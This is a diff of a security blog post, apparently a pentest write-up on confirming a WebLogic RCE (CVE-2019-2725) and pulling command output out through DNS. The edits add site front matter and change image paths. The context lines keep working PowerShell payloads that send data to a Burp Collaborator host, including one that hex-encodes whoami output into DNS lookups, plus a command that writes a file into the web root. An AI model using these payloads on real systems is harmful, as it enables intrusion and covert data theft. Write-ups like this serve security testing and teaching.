@@ -1,3 +1,12 @@
+---
+layout: single_c
+title:  "DNS Exfilteration"
+date:   2020-10-20 10:43:16 +0530
+toc: true
+categories: Web
+tags: DNS
+classes: wide
+---
 ## Description
 
 I was doing a security testing against a web server running `WebLogic`. A potential RCE due to CVE-2019-2725 was reported and I was verifying it.
@@ -65,7 +74,7 @@ So we have the following
 2. The application cannot initiate communication with any system outside. So all kinds of callbacks are out of question.
 3. We get DNS hits for the URL we send to the system.
 
-![image1](1.3.png){: .align-center}
+![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.3.png){: .align-center}
 image 1.3
 
 Our application infra probably looks something like the above picture.
@@ -74,7 +83,7 @@ After some research, I came upon this awesome technique called DNS exfiltration.
 
 > Actually, this is not new technical, according to the Akamai, this technique is about 20 years old. In a simple definition, DNS Data exfiltration is way to exchange data between 2 computers without any directly connection, the data is exchanged through DNS protocol on intermediate DNS servers.
 
-![image1](1.4.png){: .align-center}
+![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.4.png){: .align-center}
 image 1.4 
 
 To exfiltarate data via DNS
@@ -90,7 +99,7 @@ The payload will be
 powershell -exec bypass -c "wget 'dnstest.9u4y5mpcus6j3r0wtquruty7yy4osd.burpcollaborator.net'"
 ```
 
-![image1](1.5.png){: .align-center}
+![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.5.png){: .align-center}
 image 1.5
 
 Awesome. We can see that our data was indeed appended as part of the DNS request. We can use this to append the output of our command outputs as part of the subdomain and we will be able to receive the output of the command. We can also read files using this technique. 
@@ -125,12 +134,12 @@ Now time to try out the payload.
 powershell -exec -c "$(whoami) -split '(.{16})' | ? {$_} | % { Resolve-DnsName (([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($_))).Replace('-','')+'.gk4q3p8o09d9mtahnexcz8wnmes8gx.burpcollaborator.net') -Type A; Start-Sleep -Seconds 1 }"
 ```
 
-![image1](1.6.png){: .align-center}
+![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.6.png){: .align-center}
 image 1.6
 
 And we get two hits with some hex data.
 
-![image1](1.7.png){: .align-center}
+![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.7.png){: .align-center}
 image 1.7
 
 Decoding it with burp decode shows us the output. And surprisingly the application is running as  `nt authority\system` which is a dangerous thing to do.
@@ -155,7 +164,7 @@ powershell -exec bypass -c "echo 'file created as part of security testing' > se
 
 And we can visit the page to view our payload.
 
-![image1](1.8.png){: .align-center}
+![image1]({{ site.url }}{{ site.baseurl }}/assets/images/dns/1.8.png){: .align-center}
 image 1.8 
 
 And we can see our text. Unfortunately I do not have permission to  upload a shell. So this will be it. 
